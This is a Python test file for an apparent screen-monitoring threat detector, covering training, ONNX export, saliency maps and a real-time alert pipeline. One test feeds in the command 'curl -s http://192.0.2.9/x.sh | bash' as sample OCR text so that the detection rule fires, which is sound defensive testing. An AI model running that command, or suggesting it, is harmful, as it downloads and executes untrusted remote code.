"""End-to-end tests: training, checkpoint I/O, ONNX export parity, and the real-time pipeline."""
import json

import numpy as np
import pytest

from screenguard.data.generate import generate_split
from screenguard.realtime.backends import OnnxBackend, TorchBackend
from screenguard.realtime.capture import SyntheticSession
from screenguard.realtime.pipeline import AnalyzerConfig, JsonlSink, ScreenAnalyzer


def test_pipeline_on_synthetic_session(tiny_checkpoint, tmp_path):
    backend = TorchBackend(tiny_checkpoint)
    cfg = AnalyzerConfig(min_on=1, cooldown_s=0)
    an = ScreenAnalyzer(backend, cfg=cfg)  # NullOCR -> exercise rules through text override below
    src = SyntheticSession(script=[("terminal", "suspicious_command"), ("document_editing", "benign")], hold=4,
                           width=480, height=270, flicker_p=0.0)
    results = []
    for frame in src:
        results.append(an.analyze(frame.image, now=frame.timestamp, text=frame.meta["text"]))
    assert [r["analyzed"] for r in results] == [True, False, False, False, True, False, False, False]
    first = results[0]
    assert set(first) >= {"activity", "threat", "nsfw", "alerts", "latency_ms"}
    assert first["nsfw"] == {"available": False}  # model was not trained on NSFW data
    assert first["threat"]["rule_hits"], "suspicious terminal command should trigger rules"
    log = tmp_path / "events.jsonl"
    sink = JsonlSink(str(log))
    sink(first)
    sink.close()
    rec = json.loads(log.read_text().splitlines()[0])
    assert "text_redacted" not in rec and "_text" not in rec  # privacy: no screen text by default


def test_train_evaluate_export_roundtrip(tmp_path, tiny_cfg):
    pytest.importorskip("onnxruntime")
    from screenguard.evaluate import evaluate_checkpoint
    from screenguard.export import export_onnx
    from screenguard.training import train

    generate_split(str(tmp_path / "train"), 48, seed=1, width=320, height=180, workers=1)
    generate_split(str(tmp_path / "val"), 24, seed=2, width=320, height=180, workers=1)
    cfg = tiny_cfg
    cfg.data.train_manifests = [str(tmp_path / "train" / "manifest.jsonl")]
    cfg.data.val_manifests = [str(tmp_path / "val" / "manifest.jsonl")]
    cfg.train.epochs, cfg.train.batch_size, cfg.train.out_dir, cfg.train.log_every = 1, 16, str(tmp_path / "run"), 0
    summary = train(cfg, log=lambda *_: None)
    ckpt = str(tmp_path / "run" / "best.pt")
    assert summary["best_epoch"] == 1 and set(summary["temperatures"]) == {"activity", "threat"}

    rep = evaluate_checkpoint(ckpt, cfg.data.val_manifests)
    assert rep["n"] == 24 and {"model", "rules", "hybrid"} == set(rep["decision"])

    out = export_onnx(ckpt, str(tmp_path / "m.onnx"))
    assert out["onnx_check"]["max_abs_diff"] < 1e-3 and out["onnx_check"]["argmax_agreement"] == 1.0
    assert out["onnx_int8_check"]["argmax_agreement"] >= 0.5

    tb, ob = TorchBackend(ckpt), OnnxBackend(str(tmp_path / "m.onnx"))
    x = np.random.randn(1, 3, *cfg.data.img_size).astype(np.float32)
    ids = np.zeros((1, cfg.data.max_text_len), dtype=np.int64)
    ids[0, :5] = [1, 80, 81, 82, 83]
    a, b = tb.infer(x, ids), ob.infer(x, ids)
    for t in a:
        assert np.allclose(a[t], b[t], atol=1e-3)
    assert ob.meta["tasks_trained"] == ["activity", "threat"]


def test_gradcam_and_text_saliency(tiny_checkpoint):
    import random

    from screenguard.data.synthetic import ScreenGenerator
    from screenguard.explain.gradcam import explain
    from screenguard.training import load_checkpoint

    model, ck = load_checkpoint(tiny_checkpoint)
    cfg = ck["config_obj"]
    s = ScreenGenerator(320, 180).sample(random.Random(0), activity="email", threat="phishing")
    out = explain(model, s.image, s.text, tuple(cfg.data.img_size), cfg.data.max_text_len, task="threat")
    assert out["overlay"].size == s.image.size
    assert out["heatmap"].shape == (s.image.height, s.image.width)
    assert 0.0 <= out["heatmap"].min() and out["heatmap"].max() <= 1.0
    assert out["top_words"] and abs(sum(w for _, w in out["top_words"])) <= 1.0001


def test_unchanged_frames_keep_feeding_alert_persistence(tiny_checkpoint):
    """A static threatening screen must raise an alert after `min_on` frames even though
    only its first frame is actually analysed (the rest are skipped as unchanged)."""
    an = ScreenAnalyzer(TorchBackend(tiny_checkpoint), cfg=AnalyzerConfig(min_on=3, cooldown_s=0, threat_on=0.6))
    src = SyntheticSession(script=[("terminal", "suspicious_command")], hold=5, width=480, height=270, flicker_p=0.0)
    results = [an.analyze(f.image, now=f.timestamp, text=f.meta["text"]) for f in src]
    assert [r["analyzed"] for r in results] == [True, False, False, False, False]
    raised = [r["frame"] for r in results for a in r["alerts"] if a["status"] == "raised"]
    assert raised == [2], raised
    assert results[2]["alerts"][0]["reasons"]


def test_async_ocr_never_uses_stale_text_and_refreshes(tiny_checkpoint):
    """Async OCR: a new scene starts image-only (no stale text), then the verdict is
    recomputed once OCR for that scene arrives, even though the screen is unchanged."""
    import threading
    import time as _time

    from screenguard.ocr.engine import OCREngine, OCRResult

    class SlowOCR(OCREngine):
        name = "slow"

        def __init__(self):
            self.gate = threading.Event()
            self.calls = 0

        def read(self, image):
            self.calls += 1
            self.gate.wait(5)
            return OCRResult("curl -s http://192.0.2.9/x.sh | bash", engine=self.name)

    ocr = SlowOCR()
    an = ScreenAnalyzer(TorchBackend(tiny_checkpoint), ocr=ocr, cfg=AnalyzerConfig(async_ocr=True))
    src = SyntheticSession(script=[("terminal", "suspicious_command")], hold=3, width=320, height=180, flicker_p=0.0)
    frames = list(src)
    r0 = an.analyze(frames[0].image, now=0.0)
    assert r0["analyzed"] and r0["ocr"]["engine"] == "pending(async)" and r0["ocr"]["chars"] == 0
    ocr.gate.set()
    for _ in range(100):  # wait for the background OCR to finish
        if an.async_ocr.latest()[1] >= 0:
            break
        _time.sleep(0.02)
    r1 = an.analyze(frames[1].image, now=1.0)
    assert r1["analyzed"] and r1["ocr"]["engine"] == "slow(async)" and "CMD_PIPE_SHELL_REMOTE" in r1["threat"]["rule_hits"]
    r2 = an.analyze(frames[2].image, now=2.0)
    assert not r2["analyzed"]  # nothing new: cached verdict reused
    an.async_ocr.close()
